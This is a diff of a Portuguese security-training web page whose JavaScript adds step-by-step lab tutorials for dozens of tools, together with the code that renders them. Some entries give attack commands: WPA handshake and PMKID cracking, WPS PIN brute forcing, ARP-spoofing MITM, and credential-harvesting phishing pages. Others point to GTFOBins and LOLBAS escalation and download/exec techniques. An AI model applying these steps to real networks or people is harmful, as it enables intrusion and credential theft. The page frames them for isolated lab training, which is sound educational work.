+"Aircrack-ng":{a:"Lab Wi-Fi com adaptador em modo monitor (ambiente autorizado)",s:["Ative monitor: airmon-ng start wlan0","Capture: airodump-ng wlan0mon (anote BSSID/canal)","Foque e grave o handshake: airodump-ng -c CH --bssid BSSID -w cap wlan0mon","Quebre: aircrack-ng cap-01.cap -w rockyou.txt"],r:"Senha WPA recuperada a partir do handshake (lab próprio)."},
+"Wifite":{a:"Lab Wi-Fi autorizado (adaptador compatível)",s:["Ative o modo monitor.","Rode: wifite","Selecione a rede-alvo do seu lab.","Deixe capturar o handshake e tentar a quebra."],r:"Ataque Wi-Fi automatizado no seu próprio lab."},
+"Reaver":{a:"Roteador de lab com WPS habilitado (autorizado)",s:["Descubra o BSSID com airodump-ng.","Rode: reaver -i wlan0mon -b BSSID -vv","Aguarde o brute do PIN WPS."],r:"PIN WPS e senha recuperados (no seu equipamento)."},
+"Kismet":{a:"Lab Wi-Fi (adaptador em monitor)",s:["Inicie: kismet -c wlan0mon","Abra a interface web (http://localhost:2501).","Observe redes e clientes detectados."],r:"Mapa de redes/dispositivos sem fio ao redor."},
+"hcxdumptool":{a:"Lab Wi-Fi autorizado",s:["Capture PMKID: hcxdumptool -i wlan0mon -o cap.pcapng","Converta: hcxpcapngtool -o hash.hc22000 cap.pcapng","Quebre com hashcat -m 22000."],r:"PMKID capturado e pronto para cracking offline."},
+"Ettercap":{a:"Rede host-only com 2 alvos (ex.: Windows + gateway)",s:["Inicie: ettercap -T -i eth0","Faça scan de hosts e selecione os alvos.","Ative ARP poisoning (MITM) entre eles.","Observe o tráfego interceptado."],r:"Posição de MITM na LAN do lab."},
+"Bettercap":{a:"Rede host-only do lab",s:["Inicie: sudo bettercap -iface eth0","Descubra hosts: net.probe on","ARP spoof no alvo: set arp.spoof.targets IP ; arp.spoof on","Capture: net.sniff on"],r:"MITM e sniffing ativos sobre o alvo escolhido."},
+"mitmproxy":{a:"Cliente de lab configurado para usar o proxy",s:["Inicie: mitmproxy","Configure o alvo para usar o proxy (IP do Kali:8080) e instale o CA.","Navegue e inspecione/edite os fluxos HTTPS."],r:"Tráfego HTTPS do cliente interceptado e editável."},
+"tcpdump":{a:"Kali ou qualquer VM do lab",s:["Capture: sudo tcpdump -i eth0 -w cap.pcap","Filtre em tempo real: tcpdump -i eth0 port 80","Abra o cap.pcap no Wireshark para detalhar."],r:"Captura de pacotes salva para análise."},
+"macchanger":{a:"Interface de rede da VM",s:["Derrube a interface: sudo ip link set eth0 down","Troque o MAC: sudo macchanger -r eth0","Suba de novo: sudo ip link set eth0 up"],r:"Endereço MAC alterado na interface."},
+"SET (setoolkit)":{a:"Lab isolado + navegador 'vítima' no lab (autorizado)",s:["Inicie: setoolkit","Escolha 'Social-Engineering Attacks' → 'Website Attack Vectors'.","Use 'Credential Harvester' e clone um site de login.","Abra a página clonada com a vítima do lab e veja as credenciais capturadas."],r:"Demonstração controlada de captura de credenciais por phishing."},
+"Gophish":{a:"VM servindo o Gophish (lab)",s:["Baixe e rode o binário gophish.","Acesse o admin (https://IP:3333).","Crie Sending Profile, Landing Page e Template.","Lance a campanha contra e-mails do lab e veja as métricas."],r:"Campanha de phishing simulada com estatísticas."},
+"King Phisher":{a:"VM servidor King Phisher (lab)",s:["Instale o servidor e abra o cliente.","Monte a mensagem e a página de destino.","Envie para alvos do lab.","Acompanhe aberturas e cliques."],r:"Campanha de conscientização medida no lab."},
+"Wazuh":{a:"VM Wazuh (manager) + agentes nos alvos",s:["Instale o agente num alvo apontando para o manager.","Gere um evento (ex.: login falho repetido).","Teste uma regra: wazuh-logtest (cole o log).","Veja o alerta no dashboard."],r:"Evento detectado e alertado no SIEM."},
+"Sigma":{a:"Kali + logs/SIEM do lab",s:["Escreva uma regra .yml (detection + condition).","Converta para seu SIEM: sigmac -t es-qs regra.yml","Rode a query gerada no Elastic/Splunk."],r:"Detecção portável aplicada ao seu SIEM."},
+"osquery":{a:"Endpoint com osquery instalado (Linux/Windows)",s:["Abra: osqueryi","Processos: SELECT pid,name,path FROM processes;","Persistência (Linux): SELECT * FROM crontab;","Exporte a consulta para um pack agendado."],r:"Estado do endpoint consultado como banco de dados."},
+"Suricata":{a:"Security Onion ou VM com Suricata vendo o tráfego",s:["Rode numa interface: suricata -i eth0","Gere um ataque do Kali contra um alvo.","Leia os alertas em eve.json / fast.log.","Ajuste/crie regras conforme o tráfego."],r:"Ataque detectado por assinatura na rede."},
+"Snort":{a:"VM com Snort na rede do lab",s:["Rode: snort -A console -q -c /etc/snort/snort.conf -i eth0","Dispare um scan/ataque do Kali.","Observe os alertas no console.","Adicione uma regra local em local.rules."],r:"Intrusão detectada e alertada pelo IDS."},
+"Elastic / Kibana":{a:"Stack Elastic do lab (ou dentro do Security Onion)",s:["Garanta que logs/alertas estão sendo ingeridos.","Abra o Kibana e selecione o índice.","Monte uma busca (KQL) do evento de interesse.","Crie um dashboard/alerta."],r:"Eventos buscáveis e visualizados no Kibana."},
+"Splunk":{a:"VM Splunk recebendo logs do lab",s:["Configure um input (forwarder/syslog) dos alvos.","Na barra de busca: index=* failed password | stats count by host","Salve como alerta com limiar.","Monte um dashboard."],r:"Correlação e alertas de logs no Splunk."},
+"CrowdSec":{a:"VM Linux do lab com CrowdSec instalado",s:["Instale o agente e um bouncer.","Gere tentativas de brute no SSH a partir do Kali.","Veja as decisões: cscli decisions list","Confirme o IP bloqueado."],r:"IP malicioso detectado e bloqueado automaticamente."},
+"Canarytokens":{a:"Qualquer VM/arquivo do lab",s:["Gere um token em canarytokens.org (ex.: documento Word).","Coloque o arquivo isca num share 'tentador'.","Abra o arquivo (simulando o atacante).","Receba o alerta por e-mail/webhook."],r:"Alerta disparado ao tocarem na isca (deception)."},
+"Shuffle":{a:"VM Shuffle (SOAR) integrada ao SIEM",s:["Abra o Shuffle e crie um workflow.","Gatilho: alerta do Wazuh/TheHive via webhook.","Adicione uma ação (ex.: bloquear IP no firewall).","Dispare um alerta de teste e veja o playbook rodar."],r:"Resposta automatizada a um alerta (SOAR)."},
+"Atomic Red Team":{a:"Endpoint do lab com monitoração ativa (Sysmon/Wazuh)",s:["Instale o framework (Invoke-AtomicRedTeam no PowerShell).","Rode um teste: Invoke-AtomicTest T1059 -ShowDetails","Execute o teste de fato e observe no SIEM.","Verifique se sua regra detectou."],r:"Detecção validada contra uma técnica real do ATT&CK."},
+"AIDE":{a:"VM Linux do lab",s:["Instale e inicialize a base: aide --init ; mv aide.db.new aide.db","Altere um arquivo em /etc para simular comprometimento.","Cheque: aide --check","Revise o relatório de diferenças."],r:"Alterações nos arquivos críticos detectadas (FIM)."},
+"fail2ban":{a:"VM Linux com SSH exposto ao Kali (no lab)",s:["Instale e habilite a jail do sshd.","Do Kali, erre a senha SSH várias vezes.","Veja o banimento: fail2ban-client status sshd","Confirme que o IP foi bloqueado."],r:"IP banido após tentativas de brute force."},
+"Sysmon":{a:"VM Windows do lab",s:["Baixe o Sysmon (Sysinternals) e um config (ex.: SwiftOnSecurity).","Instale: sysmon -accepteula -i config.xml","Rode uma ação suspeita (ex.: powershell encoded).","Veja os eventos em Event Viewer → Sysmon/Operational."],r:"Telemetria rica de processos/rede no Windows para detecção."},
+"Lynis":{a:"VM Linux a ser auditada",s:["Rode: sudo lynis audit system","Leia os 'Warnings' e 'Suggestions'.","Anote o Hardening Index.","Aplique as correções e rode de novo."],r:"Relatório de hardening com pontuação e recomendações."},
+"OpenSCAP":{a:"VM Linux a ser auditada",s:["Baixe um perfil (ex.: SCAP Security Guide).","Rode: oscap xccdf eval --profile cis --report rel.html perfil.xml","Abra rel.html no navegador.","Corrija os itens reprovados."],r:"Relatório de conformidade CIS/STIG do host."},
+"CIS Benchmarks":{a:"Qualquer VM a ser endurecida",s:["Baixe o benchmark do sistema no site do CIS.","Compare cada item com a config atual.","Aplique os controles recomendados.","Valide com Lynis/OpenSCAP."],r:"Sistema alinhado a um padrão reconhecido de hardening."},
+"PingCastle":{a:"A partir de uma máquina no domínio (DC do lab)",s:["Baixe e rode PingCastle.exe no domínio.","Escolha 'healthcheck'.","Abra o relatório HTML gerado.","Priorize os itens de maior risco."],r:"Nota de risco e pontos fracos do AD mapeados."},
+"HardeningKitty":{a:"VM Windows a ser endurecida",s:["Importe o módulo no PowerShell (como admin).","Audite: Invoke-HardeningKitty -Mode Audit","Revise o score e os achados.","Aplique: Invoke-HardeningKitty -Mode HailMary (com cuidado)."],r:"Windows avaliado e endurecido por baseline."},
+"testssl.sh":{a:"Serviço TLS do lab (ex.: https do alvo)",s:["Rode: ./testssl.sh https://192.168.56.21","Veja protocolos fracos e ciphers ruins.","Cheque vulnerabilidades (Heartbleed etc.).","Corrija a config do servidor."],r:"Postura de TLS do serviço avaliada."},
+"pfSense (firewall)":{a:"VM pfSense do lab",s:["Acesse a WebGUI do pfSense.","Crie regras de firewall entre as redes do lab.","Teste do Kali o que foi liberado/bloqueado.","Habilite logging das regras."],r:"Tráfego do lab controlado e registrado pelo firewall."},
+"Semgrep":{a:"Kali + um repositório de código vulnerável (ex.: Juice Shop source)",s:["Entre na pasta do código.","Rode: semgrep --config auto .","Revise os achados por severidade.","Rode regras OWASP: semgrep --config p/owasp-top-ten ."],r:"Padrões inseguros apontados por arquivo e linha."},
+"CodeQL":{a:"Kali + código-fonte de teste",s:["Crie a base: codeql database create db --language=python","Rode uma query: codeql database analyze db consulta.ql --format=sarif-latest -o out.sarif","Abra o SARIF para ver os achados."],r:"Falhas encontradas via análise de fluxo de dados."},
+"Bandit":{a:"Kali + projeto Python de teste",s:["Rode: bandit -r app/","Veja os issues por severidade/confiança.","Corrija e rode de novo."],r:"Falhas comuns de Python (ex.: subprocess shell=True) listadas."},
+"Trivy":{a:"Kali + projeto ou imagem de container",s:["Filesystem: trivy fs .","Imagem: trivy image minha/app:tag","IaC: trivy config .","Priorize CRITICAL/HIGH com correção."],r:"CVEs e misconfigs de deps/imagem/IaC listados."},
+"Grype":{a:"Kali + projeto ou SBOM",s:["Direto no diretório: grype dir:.","Ou a partir do SBOM: grype sbom:./sbom.json","Falhe o build no alto: --fail-on high"],r:"Dependências vulneráveis casadas com CVEs."},
+"Syft":{a:"Kali + projeto",s:["Gere o SBOM: syft dir:. -o cyclonedx-json > sbom.json","Guarde o sbom.json junto do artefato.","Re-escaneie depois com grype sbom:./sbom.json"],r:"Inventário completo (SBOM) dos componentes."},
+"gitleaks":{a:"Kali + um repositório git",s:["Rode: gitleaks detect --source . --redact","Inclua o histórico (varre commits antigos).","Para cada achado, ROTACIONE o segredo."],r:"Segredos no código e no histórico revelados."},
+"trufflehog":{a:"Kali + um repositório git",s:["Rode: trufflehog git file://. --only-verified","Confirme quais segredos estão realmente vivos.","Revogue/rotacione os validados."],r:"Segredos vivos (verificados) identificados."},
+"Checkov":{a:"Kali + código IaC (Terraform/K8s)",s:["Rode: checkov -d .","Revise as checagens reprovadas.","Corrija o recurso (ex.: bucket público) e rode de novo."],r:"Misconfigurações de infraestrutura como código apontadas."},
+"cosign (Sigstore)":{a:"Kali + uma imagem de container de teste",s:["Assine: cosign sign registro/app@sha256:...","Verifique: cosign verify registro/app@sha256:...","Integre a verificação como gate antes do deploy."],r:"Imagem assinada e verificável (integridade da cadeia)."},
+"Snyk":{a:"Kali + projeto com dependências",s:["Autentique: snyk auth","Rode: snyk test","Veja a priorização e o caminho de upgrade.","Monitore: snyk monitor"],r:"Vulnerabilidades em deps/código priorizadas."},
+"Faraday":{a:"VM/Kali com Faraday",s:["Inicie o Faraday e crie um workspace.","Importe resultados (ex.: nmap -oX) ou use os plugins.","Organize os achados por host.","Gere o relatório."],r:"Achados centralizados e relatório consolidado."},
+"Dradis":{a:"VM/Kali com Dradis",s:["Abra o Dradis e crie um projeto.","Importe saídas de ferramentas (nmap, Burp, Nessus).","Escreva as issues com evidências.","Exporte o relatório final."],r:"Relatório profissional gerado a partir dos achados."},
+"CherryTree":{a:"Kali (durante todo o engajamento)",s:["Abra o CherryTree e crie uma árvore por host/fase.","Cole comandos, saídas e prints conforme avança.","Marque evidências e credenciais.","Exporte para HTML/PDF no fim."],r:"Notas e evidências organizadas para o relatório."},
+"Kali Linux":{a:"Referência",s:["Acesse kali.org para ISOs e imagens prontas.","Veja kali.org/tools para a lista oficial de ferramentas.","Use kali.org/docs para instalação e dúvidas."],r:"Ponto de partida para montar/entender o Kali."},
+"Kali Docs & Labs":{a:"Referência",s:["Abra kali.org/docs.","Siga o guia de instalação na sua plataforma.","Explore os metapacotes e o kali-linux-labs."],r:"Documentação oficial para dominar o Kali."},
+"MITRE ATT&CK":{a:"Referência de consulta",s:["Abra attack.mitre.org.","Procure a técnica (ex.: T1059) usada num exercício.","Leia detecção e mitigação sugeridas.","Mapeie suas regras de detecção às técnicas."],r:"Comportamento do adversário nomeado e compreendido."},
+"GTFOBins":{a:"Referência durante privesc Linux",s:["Abra gtfobins.github.io.","Busque o binário que você pode rodar como root (ex.: find, vim).","Siga o 'Sudo'/'SUID' para escalar.","Teste no alvo."],r:"Caminho de escalonamento via binário legítimo."},
+"LOLBAS":{a:"Referência durante ataque no Windows",s:["Abra lolbas-project.github.io.","Busque um binário nativo útil (ex.: certutil).","Veja o comando de download/exec sugerido.","Aplique no alvo Windows."],r:"Técnica 'living off the land' no Windows."},
+"HackTricks":{a:"Referência de metodologia",s:["Abra book.hacktricks.wiki.","Vá até a seção do serviço/porta encontrada.","Siga o checklist de enumeração/exploração.","Aplique no alvo do lab."],r:"Passo a passo de ataque para o cenário atual."},
+"PayloadsAllTheThings":{a:"Referência de payloads",s:["Abra o repositório no GitHub.","Escolha a categoria (SQLi, XSS, etc.).","Copie o payload/bypass adequado.","Adapte ao alvo."],r:"Payload certo para a vulnerabilidade em teste."},
+"Exploit-DB":{a:"Referência / também offline (searchsploit)",s:["Abra exploit-db.com e busque o serviço/versão.","Leia o exploit e os requisitos.","Baixe e adapte ao seu alvo de lab."],r:"PoC público para o serviço vulnerável."},
+"OWASP":{a:"Referência de AppSec",s:["Abra owasp.org.","Consulte o Top 10, ASVS e as Cheat Sheets.","Use a WSTG como checklist de teste.","Aplique na Prova F e nos labs web."],r:"Base de requisitos e boas práticas de segurança."},
+"PortSwigger Academy":{a:"Plataforma online (labs grátis)",s:["Crie conta em portswigger.net/web-security.","Escolha um tópico (ex.: SQL injection).","Faça os labs com o Burp Community.","Repita até fechar a trilha."],r:"Vulnerabilidades web dominadas com labs guiados."},
+"TryHackMe":{a:"Plataforma online guiada",s:["Crie conta em tryhackme.com.","Conecte via OpenVPN ou use a máquina no navegador.","Faça uma sala (ex.: trilha de iniciante).","Siga as tarefas e capture as flags."],r:"Prática guiada por tema, do básico ao avançado."},
+"Hack The Box":{a:"Plataforma online",s:["Crie conta em hackthebox.com.","Conecte via VPN ao lab.","Escolha uma máquina (comece pelas 'easy').","Enumere, explore e pegue as flags user/root."],r:"Prática realista em máquinas de dificuldade crescente."},
+"VulnHub":{a:"Download para o seu hipervisor",s:["Baixe uma VM em vulnhub.com.","Importe no VirtualBox/VMware na rede host-only.","Do Kali, descubra o IP e enumere.","Comprometa a máquina offline."],r:"Alvo adicional para praticar sem internet."},
+"OverTheWire":{a:"Plataforma online (SSH)",s:["Abra overthewire.org/wargames.","Comece pelo Bandit: ssh bandit0@bandit.labs.overthewire.org -p 2220","Resolva cada nível para achar a senha do próximo.","Avance nos jogos seguintes."],r:"Fundamentos de Linux e segurança treinados jogando."},
+"NIST":{a:"Referência de padrões",s:["Abra csrc.nist.gov.","Consulte o CSF (gestão de risco) e o SSDF (SDLC seguro).","Use o SP 800-53 para controles.","Aplique no planejamento do lab/Prova A e F."],r:"Controles e processos de referência para segurança."}
+  };
+
   function esc(s){ return (s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
-  var OSLABEL={lin:['lin','LINUX'],win:['win','WIN'],multi:['multi','MULTI'],web:['web','WEB/REF']};
+  var OSLABEL={lin:['lin','LINUX'],win:['win','WIN'],multi:['multi','MULTI'],web:['web','WEB']};
   function osBadge(os){ var o=OSLABEL[os]||OSLABEL.multi; return '<span class="os '+o[0]+'">'+o[1]+'</span>'; }
 
   var TOOLS=[];
@@ -9274,21 +9439,34 @@ NIST|web|A,F|ref|Padrões de segurança|CSF, SSDF e SP 800-53 (controles e SDLC)
     TOOLS.push({n:p[0].trim(),os:p[1].trim(),pv:p[2].trim(),c:p[3].trim(),w:p[4].trim(),u:p[5].trim(),ex:p[6].trim(),site:p[7].trim()});
   });
 
+  // CSS do tutorial
+  var st=document.createElement('style');
+  st.textContent='#ferramentas ol.tsteps{margin:4px 0 10px;padding-left:20px}#ferramentas ol.tsteps li{margin:5px 0;font-size:13px;line-height:1.5;color:var(--txt)}#ferramentas .tres{font-size:13px;color:var(--acc);margin:6px 0 0}#ferramentas .talvo{font-size:13px;margin:0 0 8px}';
+  document.head.appendChild(st);
+
   // modal
   var modal=document.getElementById('cModal'),
       mTitle=document.getElementById('cmTitle'),
       mBody=document.getElementById('cmBody');
   function openTool(t){
     mTitle.textContent=t.n;
-    var pv = (t.pv==='-'?'—':t.pv.split(',').map(function(x){return 'Prova '+x.trim();}).join(' · '));
+    var pv = (t.pv==='-'?'—':(t.pv==='LAB'?'Base do laboratório':t.pv.split(',').map(function(x){return 'Prova '+x.trim();}).join(' · ')));
     var url = t.site.indexOf('http')===0 ? t.site : 'https://'+t.site;
-    mBody.innerHTML =
+    var html =
       '<div class="tmeta">'+osBadge(t.os)+'<span class="tpv">'+pv+'</span></div>'+
       '<p><b>O que é:</b> '+esc(t.w)+'.</p>'+
       '<p><b>Para que serve:</b> '+esc(t.u)+'.</p>'+
       '<div class="h faz" style="margin:12px 0 6px"><span class="d"></span>Exemplo</div>'+
-      '<pre>'+esc(t.ex)+'</pre>'+
-      '<p style="margin-top:12px">🌐 <a href="'+url+'" target="_blank" rel="noopener noreferrer">'+esc(t.site)+'</a></p>';
+      '<pre>'+esc(t.ex)+'</pre>';
+    var tt=TUT[t.n];
+    if(tt){
+      html+='<div class="h ver" style="margin:14px 0 6px"><span class="d"></span>🧪 Passo a passo (lab em VM)</div>'+
+            '<p class="talvo"><b>🎯 Alvo:</b> '+esc(tt.a)+'</p>'+
+            '<ol class="tsteps">'+tt.s.map(function(x){return '<li>'+esc(x)+'</li>';}).join('')+'</ol>'+
+            '<p class="tres">✅ <b>Resultado:</b> '+esc(tt.r)+'</p>';
+    }
+    html+='<p style="margin-top:12px">🌐 <a href="'+url+'" target="_blank" rel="noopener noreferrer">'+esc(t.site)+'</a></p>';
+    mBody.innerHTML=html;
     modal.classList.add('show');
   }
 
@@ -9296,7 +9474,6 @@ NIST|web|A,F|ref|Padrões de segurança|CSF, SSDF e SP 800-53 (controles e SDLC)
     var el=document.createElement('div');
     el.className='gi click tool';
     el.setAttribute('data-name',t.n.toLowerCase());
-    el.setAttribute('data-kw',(t.n+' '+t.w+' '+t.u).toLowerCase());
     el.innerHTML='<b>'+esc(t.n)+'</b> '+osBadge(t.os)+'<div class="tsub">'+esc(t.w)+'</div><span class="more">ⓘ</span>';
     el.addEventListener('click',function(){ openTool(t); });
     return el;
@@ -9315,6 +9492,11 @@ NIST|web|A,F|ref|Padrões de segurança|CSF, SSDF e SP 800-53 (controles e SDLC)
 
   CATS.forEach(function(c,i){
     var p=document.createElement('div'); p.className='apanel'+(i===0?' active':''); p.id='tp-'+c[0];
+    if(c[0]==='lab'){
+      var intro=document.createElement('div'); intro.className='disc'; intro.style.marginBottom='14px';
+      intro.innerHTML='🖥️ <b>Monte o laboratório primeiro.</b> Use uma rede <b>isolada</b> (host-only/interna) e <b>snapshots</b> antes de cada exercício — nunca exponha alvos vulneráveis à internet. Mínimo recomendado: Kali + Metasploitable + Windows eval (+ Security Onion/Wazuh quando for treinar defesa). Reserve ~200–300 GB de disco e 16 GB+ de RAM.';
+      p.appendChild(intro);
+    }
     var g=document.createElement('div'); g.className='gloss';
     TOOLS.filter(function(t){return t.c===c[0];}).forEach(function(t){ g.appendChild(cardEl(t)); });
     p.appendChild(g); mount.appendChild(p);
@@ -9337,14 +9519,14 @@ NIST|web|A,F|ref|Padrões de segurança|CSF, SSDF e SP 800-53 (controles e SDLC)
 
   // busca/filtro
   var q=document.getElementById('tq'), info=document.getElementById('tinfo');
-  info.textContent=TOOLS.length+' ferramentas no arsenal';
+  info.textContent=TOOLS.length+' itens no arsenal';
   q.addEventListener('input',function(){
     var v=q.value.trim().toLowerCase();
     if(!v){
       bar.style.display=''; rp.classList.remove('active');
       mount.querySelectorAll('.apanel').forEach(function(x){x.classList.remove('active');});
       var act=bar.querySelector('.atab.active'); if(act){ var el=document.getElementById(act.getAttribute('data-tp')); if(el) el.classList.add('active'); }
-      info.textContent=TOOLS.length+' ferramentas no arsenal';
+      info.textContent=TOOLS.length+' itens no arsenal';
       return;
     }
     bar.style.display='none';
@@ -9352,7 +9534,7 @@ NIST|web|A,F|ref|Padrões de segurança|CSF, SSDF e SP 800-53 (controles e SDLC)
     rg.innerHTML='';
     var matches=TOOLS.filter(function(t){ return (t.n+' '+t.w+' '+t.u).toLowerCase().indexOf(v)>=0; });
     matches.forEach(function(t){ rg.appendChild(cardEl(t)); });
-    if(!matches.length) rg.innerHTML='<div class="tempty">Nenhuma ferramenta encontrada para "'+esc(v)+'".</div>';
+    if(!matches.length) rg.innerHTML='<div class="tempty">Nada encontrado para "'+esc(v)+'".</div>';
     rp.classList.add('active');
     info.textContent=matches.length+' resultado(s) para "'+v+'"';
   });
